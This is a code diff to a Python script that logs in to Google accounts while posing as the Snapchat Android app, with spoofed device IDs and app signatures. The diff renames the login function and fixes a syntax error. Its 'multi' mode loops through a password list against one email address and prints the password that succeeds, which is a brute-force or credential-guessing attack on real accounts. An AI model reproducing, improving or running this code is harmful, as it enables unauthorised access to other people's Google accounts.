@@ -21,7 +21,7 @@ def encryptPassword(email, password):
     output = unhexlify(ste)
     encryptedPassword = b64encode(output).encode('ascii').replace("+","-").replace("/","_")
     return encryptedPassword
-def get_auth_token(email, password):
+def login(email, password):
     encryptedPasswd = encryptPassword(email, password)
     postfields = {'device_country': 'us','operatorCountry': 'us','lang': 'en_US','sdk_version': '19','google_play_services_version': '7097038','accountType': 'HOSTED_OR_GOOGLE','Email': email,'service': 'audience:server:client_id:694893979329-l59f3phl42et9clpoo296d8raqoljl6p.apps.googleusercontent.com','source': 'android','androidId': '378c184c6070c26c','app': 'com.snapchat.android','client_sig': '49f6badb81d89a9e38d65de76f09355071bd67e7','callerPkg': 'com.snapchat.android','callerSig': '49f6badb81d89a9e38d65de76f09355071bd67e7','EncryptedPasswd': encryptedPasswd}
     headers = {'device': '378c184c6070c26c','app': 'com.snapchat.android','User-Agent': 'GoogleAuth/1.4 (mako JDQ39)','Accept-Encoding': 'gzip'}
@@ -35,15 +35,15 @@ if __name__ == "__main__":
 	if do == "one":
 		e = str(input("Email ?"))
 		p = str(input("Pass ?"))
-		print(get_auth_token(e,p))
-	elif do == "multi"
+		print(login(e,p))
+	elif do == "multi":
 		e2 = str(input("Email ?"))
 		pl = str(input("Pass List ?"))
 		i = open(pl,'r').read().splitlines()
 		for passwd in i:
-			if get_auth_token(e2,passwd) == True:
+			if login(e2,passwd) == True:
 				print("Password is :"+passwd)
 				exit()
 			else:
-				print(get_auth_token(e2,passwd))
+				print(login(e2,passwd))
 	else: exit()
